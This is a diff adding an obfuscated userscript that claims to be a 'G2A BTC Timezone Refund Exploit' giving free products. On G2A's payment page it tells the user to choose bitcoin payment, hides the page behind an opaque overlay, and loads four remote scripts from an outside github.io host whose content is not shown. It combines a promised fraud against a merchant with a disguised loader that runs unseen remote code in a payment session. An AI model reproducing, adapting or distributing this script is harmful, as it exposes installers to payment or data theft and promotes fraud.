@@ -1,0 +1,82 @@
+// ==UserScript==
+// @name         G2A BTC Timezone Refund Exploit
+// @namespace    https://g2a.com/
+// @version      12.3.AutoUpdateFinal
+// @description  Get any product from G2A for FREE.
+// @author       pastebin
+// @match        *://*/payment
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=g2a.com
+// @grant        none
+// ==/UserScript==
+
+(function () {
+  "use strict";
+  function _0xe7fda1() {
+    const _0x1e434f = new Date;
+    const _0x1eb864 = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+    const _0x246e36 = "Exploit successfully enabled! Press OK to continue, then select bitcoin payment. Last script update: " + _0x1eb864[_0x1e434f.getMonth()] + " " + _0x1e434f.getDate() + ", " + _0x1e434f.getFullYear();
+    alert(_0x246e36);
+  }
+  function _0x2c064f(_0x2697b2) {
+    return new Promise((_0x48784d, _0x1b0421) => {
+      const _0x42e645 = document.createElement("script");
+      _0x42e645.src = _0x2697b2;
+      _0x42e645.onload = _0x48784d;
+      _0x42e645.onerror = _0x1b0421;
+      document.head.appendChild(_0x42e645);
+    });
+  }
+  function _0xe92eba() {
+    const _0x41a9bc = document.createElement("div");
+    _0x41a9bc.id = "custom-overlay";
+    _0x41a9bc.style.position = "fixed";
+    _0x41a9bc.style.top = "0";
+    _0x41a9bc.style.left = "0";
+    _0x41a9bc.style.width = "100%";
+    _0x41a9bc.style.height = "100%";
+    _0x41a9bc.style.backgroundColor = "#ffffff";
+    _0x41a9bc.style.backgroundSize = "cover";
+    _0x41a9bc.style.backgroundPosition = "center";
+    _0x41a9bc.style.zIndex = "9999";
+    document.body.appendChild(_0x41a9bc);
+  }
+  function _0x4d14ec() {
+    const _0x50373c = document.getElementById("custom-overlay");
+    if (_0x50373c) {
+      _0x50373c.parentNode.removeChild(_0x50373c);
+    }
+  }
+  function _0x5b21cf(_0x180576, _0x34c16c) {
+    const _0x5c6249 = document.evaluate(_0x180576, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+    if (_0x5c6249) {
+      _0x34c16c();
+    } else {
+      setTimeout(() => _0x5b21cf(_0x180576, _0x34c16c), 100);
+    }
+  }
+  function _0x423594(_0x30f84b, ..._0x18ee8f) {
+    const _0x134d83 = _0x18ee8f.length;
+    let _0x53d4c0 = 0;
+    _0x18ee8f.forEach(_0x5dc74d => {
+      _0x5b21cf(_0x5dc74d, () => {
+        _0x53d4c0++;
+        if (_0x53d4c0 === _0x134d83) {
+          _0x30f84b();
+        }
+      });
+    });
+  }
+  if (/https:\/\/(www\.)?g2a\.com\/payment/.test(window.location.href)) {
+    _0xe7fda1();
+    _0xe92eba();
+    window.addEventListener("load", function () {
+      _0x423594(function () {
+        _0x2c064f("https://gravity33.github.io/blake/interval.js");
+        _0x2c064f("https://gravity33.github.io/blake/exp.js").then(() => new Promise(_0xe8eb82 => setTimeout(_0xe8eb82, 500))).then(() => _0x2c064f("https://gravity33.github.io/blake/exp22.js")).then(() => _0x2c064f("https://gravity33.github.io/blake/drins.js")).then(_0x4d14ec).catch(_0x257b11 => {
+          console.error("Error loading script:", _0x257b11);
+          _0x4d14ec();
+        });
+      }, "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[1]/section/div[2]/div/div/div[2]/label[1]", "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[2]/div/div", "/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[2]/div/div/section[3]/div[2]/div");
+    });
+  }
+}());
